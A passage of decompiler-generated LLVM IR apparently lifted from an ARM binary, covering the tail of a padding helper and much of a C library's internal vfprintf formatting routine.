  br i1 %v2_14874, label %dec_label_pc_148c8thread-pre-split, label %dec_label_pc_1488c

dec_label_pc_1488c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14890 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14890, i32* %r0.global-to-local, align 4
  %v1_14894 = load i32, i32* %r4.global-to-local, align 4
  %v2_14894 = sub i32 %v1_14894, %v3_14890
  store i32 %v2_14894, i32* @r4, align 4
  store i32 %v3_14890, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_14894, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_148a8

.thread:                                          ; preds = %dec_label_pc_1488c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148c4

dec_label_pc_148a8:                               ; preds = %dec_label_pc_1488c
  %v0_148a8 = load i32, i32* @r5, align 4
  %v1_148a8 = urem i32 %v0_148a8, 128
  %v0_148ac = load i32, i32* @r8, align 4
  store i32 %v0_148ac, i32* %r0.global-to-local, align 4
  %v3_148b4 = trunc i32 %v1_148a8 to i8
  %v4_148b4 = call i32 @_charpad(i32 %v0_148ac, i8 %v3_148b4, i32 %v2_14894)
  store i32 %v4_148b4, i32* %r0.global-to-local, align 4
  %v1_148b8 = load i32, i32* @r4, align 4
  %v9_148b8 = icmp eq i32 %v4_148b4, %v1_148b8
  store i32 %v4_148b4, i32* %r5.global-to-local, align 4
  br i1 %v9_148b8, label %dec_label_pc_148a8.dec_label_pc_148c4_crit_edge, label %dec_label_pc_148e4

dec_label_pc_148a8.dec_label_pc_148c4_crit_edge:  ; preds = %dec_label_pc_148a8
  %v0_148c4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_148c4

dec_label_pc_148c4:                               ; preds = %.thread, %dec_label_pc_148a8.dec_label_pc_148c4_crit_edge
  %v0_148c4 = phi i32 [ %v0_148c4.pre, %dec_label_pc_148a8.dec_label_pc_148c4_crit_edge ], [ %v3_14890, %.thread ]
  store i32 %v0_148c4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_148c8

dec_label_pc_148c8thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148c8

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148c8thread-pre-split, %dec_label_pc_148c4
  %v5_148d4 = phi i32 [ %arg3, %dec_label_pc_148c8thread-pre-split ], [ %v0_148c4, %dec_label_pc_148c4 ]
  %tmp14 = icmp slt i32 %v5_148d4, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_148c8
  br label %bb15

bb:                                               ; preds = %dec_label_pc_148c8
  %v5_148d0 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_148d0, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_19f08.1335 to i32))
  %v0_148e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_148e0 = add i32 %storemerge, %v0_148e0
  store i32 %v2_148e0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148a8, %bb15
  %v0_148e4 = phi i32 [ %v4_148b4, %dec_label_pc_148a8 ], [ %v2_148e0, %bb15 ]
  store i32 %v0_148e4, i32* %r0.global-to-local, align 4
  %v2_148e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_148e8, i32* %r4.global-to-local, align 4
  store i32 %v6_1486c, i32* %r5.global-to-local, align 4
  ret i32 %v0_148e4

; uselistorder directives
  uselistorder i32 %v0_148e4, { 1, 0 }
  uselistorder i32 %v0_148c4, { 1, 0 }
  uselistorder i32 %v2_14894, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_148e4, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_148c4, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_148f0 = load i32, i32* @r5, align 4
  %v9_148f0 = load i32, i32* @r6, align 4
  %v12_148f0 = load i32, i32* @r7, align 4
  %v18_148f0 = load i32, i32* @sb, align 4
  %v21_148f0 = load i32, i32* @sl, align 4
  %v24_148f0 = load i32, i32* @fp, align 4
  %v2_148f8 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_148f8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_148f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14908 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14908, i32* @r5, align 4
  %v2_1490c = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_1490c, i32* %r0.global-to-local, align 4
  %v1_14914 = icmp slt i32 %v2_1490c, 0
  br i1 %v1_14914, label %dec_label_pc_14924, label %dec_label_pc_14958

dec_label_pc_14924:                               ; preds = %entry
  %v3_14924 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14924, i32* @r4, align 4
  %v1_14928 = inttoptr i32 %v3_14924 to i8*
  store i32 %v3_14924, i32* %r0.global-to-local, align 4
  %v3_1492c = call i32 @strlen(i8* %v1_14928)
  store i32 %v3_1492c, i32* %r0.global-to-local, align 4
  %v2_14930 = icmp eq i32 %v3_1492c, 0
  br i1 %v2_14930, label %bb, label %dec_label_pc_14940

bb:                                               ; preds = %dec_label_pc_14924
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14fa8

dec_label_pc_14940:                               ; preds = %dec_label_pc_14924
  %v0_14940 = load i32, i32* @r4, align 4
  store i32 %v0_14940, i32* %r0.global-to-local, align 4
  %v0_14944 = load i32, i32* @fp, align 4
  store i32 %v0_14944, i32* %r2.global-to-local, align 4
  %v3_14948 = inttoptr i32 %v0_14944 to i16*
  %v4_14948 = call i32 @__stdio_fwrite(i32 %v0_14940, i32 %v3_1492c, i16* %v3_14948)
  store i32 %v4_14948, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14fa8

dec_label_pc_14958:                               ; preds = %entry
  %v0_14958 = load i32, i32* @r5, align 4
  store i32 %v2_148f8, i32* %r0.global-to-local, align 4
  %v2_14960 = call i32 @_ppfs_prepargs(i32 %v2_148f8, i32 %v0_14958)
  store i32 %v2_14960, i32* %r0.global-to-local, align 4
  store i32 908, i32* @ip, align 4
  %v0_149a8 = load i32, i32* @r4, align 4
  store i32 %v0_149a8, i32* %r2.global-to-local, align 4
  %v1_14a2c = bitcast i32* %stack_var_-352 to i8*
  %v4_14a3c = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_14a48 = ptrtoint i32* %stack_var_-272 to i32
  %v2_14a60 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14a7c = icmp eq i32 %tmp104, 0
  %v2_14db4 = ptrtoint i32* %stack_var_-200 to i32
  %v2_14df8 = ptrtoint i32* %stack_var_-348 to i32
  %v2_14dfc = ptrtoint i32* %stack_var_-72 to i32
  %v2_14cb0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14cbc = ptrtoint i32* %stack_var_-52 to i32
  %v7_14b18 = zext i8 %tmp102 to i32
  %v2_14b50 = ptrtoint i32* %stack_var_-73 to i32
  %v1_14b58 = bitcast i32* %stack_var_-73 to i8*
  %v2_14b60 = icmp ugt i32 %tmp104, 4
  %v7_14b60 = icmp eq i32 %tmp104, 5
  %v7_14a44 = ptrtoint i32* %stack_var_-280 to i32
  %v5_14a74195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_14c84 = icmp ugt i32 %tmp104, 16
  %v7_14c84 = icmp eq i32 %tmp104, 17
  %v2_14c88 = xor i1 %v7_14c84, true
  %v3_14c88 = and i1 %v2_14c84, %v2_14c88
  %v2_14d0c = icmp ugt i32 %tmp104, 18
  %v7_14d0c = icmp eq i32 %tmp104, 19
  %v2_14d10 = xor i1 %v7_14d0c, true
  %v3_14d10 = and i1 %v2_14d0c, %v2_14d10
  %v7_14da8 = icmp eq i32 %tmp104, 20
  %v1_14ac0 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37613)
  %v2_14ac0 = inttoptr i32 %v1_14ac0 to i8*
  %v2_14aec = xor i1 %v7_14b60, true
  %v3_14aec = and i1 %v2_14b60, %v2_14aec
  %v7_14b20 = icmp eq i32 %tmp104, 1
  %v2_14b68 = xor i1 %v2_14b60, true
  %v3_14b68 = or i1 %v7_14b60, %v2_14b68
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_14bd0 = icmp eq i32 %tmp104, 3
  %v11_14bdc = icmp eq i32 %tmp104, 4
  %v9_14a4c = mul nuw nsw i32 %v4_14a3c, 8
  %v10_14a4c = add i32 %v7_14a44, %v9_14a4c
  br label %dec_label_pc_149ac.outer

dec_label_pc_149ac.outer:                         ; preds = %dec_label_pc_14f8c, %dec_label_pc_14958
  %v0_149ac45 = phi i32 [ %v3_14f8c, %dec_label_pc_14f8c ], [ %v0_149a8, %dec_label_pc_14958 ]
  %v0_14ae0 = phi i32 [ %stack_var_-336.4, %dec_label_pc_14f8c ], [ %tmp103, %dec_label_pc_14958 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_14f8c ], [ 0, %dec_label_pc_14958 ]
  br label %dec_label_pc_149ac.outer36

dec_label_pc_149ac.outer36:                       ; preds = %dec_label_pc_149ac.outer, %dec_label_pc_14f98
  %v0_149ac44 = phi i32 [ %v0_149ac45, %dec_label_pc_149ac.outer ], [ %v1_14f98, %dec_label_pc_14f98 ]
  %v5_149d8 = phi i32 [ %v0_149ac45, %dec_label_pc_149ac.outer ], [ %v1_14a08, %dec_label_pc_14f98 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_149ac.outer ], [ %v1_14e78, %dec_label_pc_14f98 ]
  %v1_149ac188 = inttoptr i32 %v0_149ac44 to i8*
  %v2_149ac189 = load i8, i8* %v1_149ac188, align 1
  %v2_149b0191 = icmp eq i8 %v2_149ac189, 0
  br i1 %v2_149b0191, label %dec_label_pc_149c8, label %bb138

bb138:                                            ; preds = %dec_label_pc_149ac.outer36, %.thread6
  %v2_149ac193 = phi i8 [ %v2_149ac, %.thread6 ], [ %v2_149ac189, %dec_label_pc_149ac.outer36 ]
  %v1_149c0192 = phi i32 [ %v2_149c0, %.thread6 ], [ %v0_149ac44, %dec_label_pc_149ac.outer36 ]
  %v8_149b4 = icmp eq i8 %v2_149ac193, 37
  br i1 %v8_149b4, label %dec_label_pc_149c8, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_149c0 = add i32 %v1_149c0192, 1
  store i32 %v2_149c0, i32* @r4, align 4
  %v1_149ac = inttoptr i32 %v2_149c0 to i8*
  %v2_149ac = load i8, i8* %v1_149ac, align 1
  %v2_149b0 = icmp eq i8 %v2_149ac, 0
  br i1 %v2_149b0, label %dec_label_pc_149c8, label %bb138

dec_label_pc_149c8:                               ; preds = %bb138, %.thread6, %dec_label_pc_149ac.outer36
  %v1_149c0.lcssa = phi i32 [ %v0_149ac44, %dec_label_pc_149ac.outer36 ], [ %v2_149c0, %.thread6 ], [ %v1_149c0192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_149c8 = sub i32 %v1_149c0.lcssa, %v5_149d8
  %v9_149c8 = icmp eq i32 %v1_149c0.lcssa, %v5_149d8
  br i1 %v9_149c8, label %dec_label_pc_149fc, label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_149c8
  store i32 %v2_149c8, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_149c8, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_149d0
  store i32 %v5_149d8, i32* %r0.global-to-local, align 4
  %v5_149e0 = load i32, i32* @fp, align 4
  store i32 %v5_149e0, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_149d0, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_149d0 ]
  store i32 84456, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_19f08.1335 to i32))
  %v0_149e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_149e8 = load i32, i32* @r5, align 4
  %v9_149e8 = icmp eq i32 %v0_149e8, %v1_149e8
  br i1 %v9_149e8, label %dec_label_pc_149f0, label %dec_label_pc_14fa0

dec_label_pc_149f0:                               ; preds = %bb142
  %v2_149f4 = add i32 %v0_149e8, %stack_var_-356.1.ph37
  store i32 %v2_149f4, i32* @ip, align 4
  %v0_149fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149c8, %dec_label_pc_149f0
  %v0_14a10 = phi i32 [ %v5_149d8, %dec_label_pc_149c8 ], [ %v0_149fc.pre, %dec_label_pc_149f0 ]
  %v1_14e78 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_149c8 ], [ %v2_149f4, %dec_label_pc_149f0 ]
  %v1_149fc = inttoptr i32 %v0_14a10 to i8*
  %v2_149fc = load i8, i8* %v1_149fc, align 1
  %v2_14a00 = icmp eq i8 %v2_149fc, 0
  br i1 %v2_14a00, label %dec_label_pc_14fa8, label %dec_label_pc_14a08

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149fc
  %v1_14a08 = add i32 %v0_14a10, 1
  %v2_14a08 = inttoptr i32 %v1_14a08 to i8*
  %v3_14a08 = load i8, i8* %v2_14a08, align 1
  %v7_14a0c = icmp eq i8 %v3_14a08, 37
  store i32 %v1_14a08, i32* %r2.global-to-local, align 4
  br i1 %v7_14a0c, label %dec_label_pc_14f98, label %dec_label_pc_14a18

dec_label_pc_14a18:                               ; preds = %dec_label_pc_14a08
  store i32 %v2_148f8, i32* @r4, align 4
  store i32 %v2_148f8, i32* %r0.global-to-local, align 4
  store i32 %v1_14a08, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_14a2c = call i32 @_ppfs_parsespec(i8* %v1_14a2c)
  store i32 %v2_148f8, i32* @r0, align 4
  %v0_14a34 = call i32 @_ppfs_setargs()
  store i32 %v0_14a34, i32* %r0.global-to-local, align 4
  store i32 %v4_14a3c, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_14a18
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_14a18, %bb145
  %storemerge = phi i32 [ %v10_14a4c, %bb145 ], [ %v7_14a48, %dec_label_pc_14a18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_14a74195, label %dec_label_pc_14a58, label %dec_label_pc_14a78

dec_label_pc_14a58:                               ; preds = %bb146, %dec_label_pc_14a58
  %v5_14a64197 = phi i32 [ %v5_14a64, %dec_label_pc_14a58 ], [ %v2_14a60, %bb146 ]
  %v0_14a58196 = phi i32 [ %v1_14a5c, %dec_label_pc_14a58 ], [ %storemerge, %bb146 ]
  %v2_14a58 = add i32 %v5_14a64197, -32
  %v3_14a58 = inttoptr i32 %v2_14a58 to i32*
  store i32 %v0_14a58196, i32* %v3_14a58, align 4
  %v0_14a5c = load i32, i32* %r0.global-to-local, align 4
  %v1_14a5c = add i32 %v0_14a5c, 8
  store i32 %v1_14a5c, i32* %r0.global-to-local, align 4
  %v1_14a64.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14a64 = mul i32 %v1_14a64.pre, 4
  %v5_14a64 = add i32 %v4_14a64, %v2_14a60
  %v1_14a70 = add i32 %v1_14a64.pre, 1
  store i32 %v1_14a70, i32* %r2.global-to-local, align 4
  %v5_14a74 = icmp slt i32 %v1_14a64.pre, %tmp105
  br i1 %v5_14a74, label %dec_label_pc_14a58, label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %dec_label_pc_14a58, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_14a7c, label %dec_label_pc_14a84, label %dec_label_pc_14aa8

dec_label_pc_14a84:                               ; preds = %dec_label_pc_14a78
  %v3_14a84 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_14e78, i32* @ip, align 4
  %v1_14a90 = inttoptr i32 %v3_14a84 to i32*
  %v2_14a90 = load i32, i32* %v1_14a90, align 4
  store i32 %v2_14a90, i32* %r0.global-to-local, align 4
  %v1_14a94 = and i32 %v0_14ae0, 3840
  store i32 %v1_14e78, i32* %r2.global-to-local, align 4
  %v3_14a9c = ashr i32 %v1_14e78, 31
  %v4_14aa0 = inttoptr i32 %v2_14a90 to i16*
  %v5_14aa0 = call i32 @_store_inttype(i16* %v4_14aa0, i32 %v1_14a94, i32 %v1_14e78, i32 %v3_14a9c)
  store i32 %v5_14aa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f8c

dec_label_pc_14aa8:                               ; preds = %dec_label_pc_14a78
  br i1 %tmp207, label %dec_label_pc_14c44, label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14aa8
  %v3_14ac0 = load i8, i8* %v2_14ac0, align 1
  %v4_14ac0 = zext i8 %v3_14ac0 to i32
  %v7_14ac4 = icmp eq i8 %v3_14ac0, 10
  br i1 %v7_14ac4, label %dec_label_pc_14ad0, label %bb147

bb147:                                            ; preds = %dec_label_pc_14ab0
  br label %bb151

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14ab0
  %v1_14ae0 = and i32 %v0_14ae0, 64
  %v2_14ae0 = icmp eq i32 %v1_14ae0, 0
  br i1 %v2_14ae0, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_14ad0
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_14ad0, %bb150
  br i1 %v3_14aec, label %.thread, label %dec_label_pc_14af4

.thread:                                          ; preds = %bb151
  %v5_14aec = sub nsw i32 0, %v4_14ac0
  br label %dec_label_pc_14b0c

dec_label_pc_14af4:                               ; preds = %bb151
  br i1 %v7_14bd0, label %bb152, label %dec_label_pc_14b00

bb152:                                            ; preds = %dec_label_pc_14af4
  br label %dec_label_pc_14b0c

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af4
  br i1 %v7_14b20, label %dec_label_pc_14b10, label %dec_label_pc_14b0c

dec_label_pc_14b0c:                               ; preds = %.thread, %bb152, %dec_label_pc_14b00
  %v0_14b3881 = phi i32 [ %v5_14aec, %.thread ], [ %v4_14ac0, %bb152 ], [ %v4_14ac0, %dec_label_pc_14b00 ]
  br label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14b00, %dec_label_pc_14b0c
  %v0_14b3880 = phi i32 [ %v0_14b3881, %dec_label_pc_14b0c ], [ %v4_14ac0, %dec_label_pc_14b00 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_14b0c ], [ 6, %dec_label_pc_14b00 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_14b10 = load i32, i32* %stack_var_-348, align 4
  %v1_14b14 = icmp slt i32 %v3_14b10, 0
  %v7_14b18. = select i1 %v1_14b14, i32 %v7_14b18, i32 32
  store i32 %v7_14b18., i32* @sb, align 4
  br i1 %v7_14b20, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_14b10
  store i32 %v2_14a60, i32* %r2.global-to-local, align 4
  %v2_14b28 = load i32, i32* @ip, align 4
  %v5_14b28 = mul i32 %v2_14b28, 4
  %v6_14b28 = add i32 %v5_14b28, %v2_14a60
  %v2_14b2c = add i32 %v6_14b28, -276
  %v3_14b2c = inttoptr i32 %v2_14b2c to i32*
  %v4_14b2c = load i32, i32* %v3_14b2c, align 4
  %v2_14b34 = and i32 %v4_14b2c, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_14b10, %.thread15
  %storemerge93 = phi i32 [ %v2_14b34, %.thread15 ], [ 1024, %dec_label_pc_14b10 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_14b3880, i32* @r2, align 4
  %v3_14b3c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14b3c, i32* @r1, align 4
  %v0_14b40 = call i32 @_load_inttype()
  store i32 %v0_14b40, i32* @r2, align 4
  %v0_14b4c = load i32, i32* @r1, align 4
  store i32 %v0_14b4c, i32* @r3, align 4
  store i32 %v2_14b50, i32* %r0.global-to-local, align 4
  %v2_14b58 = call i32 @_uintmaxtostr(i8* %v1_14b58)
  store i32 %v2_14b58, i32* %r0.global-to-local, align 4
  store i32 %v2_14b58, i32* @r4, align 4
  br i1 %v3_14b68, label %bb160, label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %bb157
  %v3_14b58 = inttoptr i32 %v2_14b58 to i8*
  %v3_14b6c = load i8, i8* %v3_14b58, align 1
  %v7_14b70 = icmp eq i8 %v3_14b6c, 45
  %v2_14b78 = or i32 %v0_14ae0, 2
  %v2_14b78.stack_var_-336.0 = select i1 %v7_14b70, i32 %v2_14b78, i32 %v0_14ae0
  br i1 %v7_14b70, label %.thread17, label %dec_label_pc_14b8c

.thread17:                                        ; preds = %dec_label_pc_14b6c
  %v3_14b7c = add i32 %v2_14b58, 1
  store i32 %v3_14b7c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b6c
  %v1_14b8c = and i32 %v2_14b78.stack_var_-336.0, 2
  %v2_14b8c = icmp eq i32 %v1_14b8c, 0
  br i1 %v2_14b8c, label %dec_label_pc_14b98, label %bb158

bb158:                                            ; preds = %dec_label_pc_14b8c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b8c
  %v1_14b98 = urem i32 %v2_14b78.stack_var_-336.0, 2
  %v2_14b98 = icmp eq i32 %v1_14b98, 0
  br i1 %v2_14b98, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_14b98
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_14b98, %bb159
  %v0_14bf4 = phi i32 [ %v2_14b58, %bb157 ], [ %v3_14b7c, %.thread17 ], [ %v2_14b58, %dec_label_pc_14b98 ], [ %v2_14b58, %bb159 ], [ %v2_14b58, %bb158 ]
  %v0_14bb0 = phi i32 [ %v0_14ae0, %bb157 ], [ %v2_14b78, %.thread17 ], [ %v0_14ae0, %dec_label_pc_14b98 ], [ %v0_14ae0, %bb159 ], [ %v0_14ae0, %bb158 ]
  %v3_14ba0 = load i32, i32* %stack_var_-348, align 4
  %v1_14ba8 = icmp slt i32 %v3_14ba0, 0
  br i1 %v1_14ba8, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_14ba0, %bb160 ]
  %v0_14bd8 = phi i32 [ 1, %bb161 ], [ %v3_14ba0, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_14bb0 = and i32 %v0_14bb0, 16
  %v2_14bb0 = icmp eq i32 %v1_14bb0, 0
  %v2_14bbc = sub i32 %v2_14b50, %v0_14bf4
  store i32 %v2_14bbc, i32* @r5, align 4
  br i1 %v2_14bb0, label %bb169, label %dec_label_pc_14bc4

dec_label_pc_14bc4:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_14bc4
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14bc4, %bb163
  br i1 %v7_14bd0, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_14bd8, %v2_14bbc
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_14bdc, label %dec_label_pc_14be4, label %bb169

dec_label_pc_14be4:                               ; preds = %bb167
  %v1_14be4 = inttoptr i32 %v0_14bf4 to i8*
  %v2_14be4 = load i8, i8* %v1_14be4, align 1
  %v7_14be8 = icmp eq i8 %v2_14be4, 48
  br i1 %v7_14be8, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_14be4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_14be4
  %v2_14bf0 = add i32 %v2_14bbc, 1
  store i32 %v2_14bf0, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_14c34 = phi i32 [ %v0_14bd8, %bb167 ], [ %v0_14bd8, %bb162 ], [ 1, %bb168 ], [ %v2_14bf0, %.thread24 ], [ %v0_14bd8, %bb166 ]
  %v1_14bf4 = inttoptr i32 %v0_14bf4 to i8*
  %v2_14bf4 = load i8, i8* %v1_14bf4, align 1
  %v7_14bf8 = icmp eq i8 %v2_14bf4, 48
  br i1 %v7_14bf8, label %dec_label_pc_14c00, label %dec_label_pc_14c30

dec_label_pc_14c00:                               ; preds = %bb169
  %v0_14c04 = load i32, i32* @r6, align 4
  %v7_14c08 = icmp slt i32 %v0_14c04, 6
  br i1 %v7_14c08, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_14c00
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_14c00, %bb170
  br i1 %v7_14b20, label %.thread27, label %dec_label_pc_14c24

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37640), i32* @r4, align 4
  br label %dec_label_pc_14c3c

dec_label_pc_14c24:                               ; preds = %bb171
  %v2_14c24 = icmp eq i32 %v5_14c34, 0
  br i1 %v2_14c24, label %bb172, label %dec_label_pc_14c30

bb172:                                            ; preds = %dec_label_pc_14c24
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14c3c

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14c24, %bb169
  %v2_14c30 = sub i32 %v5_14c34, %v2_14bbc
  %tmp211 = icmp ugt i32 %v5_14c34, %v2_14bbc
  br i1 %tmp211, label %.thread85, label %dec_label_pc_14c3c

.thread85:                                        ; preds = %dec_label_pc_14c30
  store i32 %v2_14c30, i32* @r8, align 4
  br label %dec_label_pc_14e48thread-pre-split

dec_label_pc_14c3c:                               ; preds = %dec_label_pc_14c30, %.thread27, %bb172
  %v1_14e4c.pre205 = phi i32 [ %v2_14bbc, %dec_label_pc_14c30 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_14e48thread-pre-split

dec_label_pc_14c44:                               ; preds = %dec_label_pc_14aa8
  br i1 %tmp208, label %dec_label_pc_14c84, label %dec_label_pc_14c4c

dec_label_pc_14c4c:                               ; preds = %dec_label_pc_14c44
  %v3_14c5c = load i32, i32* %stack_var_-72, align 4
  %v0_14c60 = load i32, i32* @fp, align 4
  store i32 %v0_14c60, i32* %r0.global-to-local, align 4
  %v1_14c64 = inttoptr i32 %v3_14c5c to i32*
  %v2_14c64 = load i32, i32* %v1_14c64, align 4
  store i32 %v2_14c64, i32* %r2.global-to-local, align 4
  %v3_14c64 = add i32 %v3_14c5c, 4
  %v4_14c64 = inttoptr i32 %v3_14c64 to i32*
  %v5_14c64 = load i32, i32* %v4_14c64, align 4
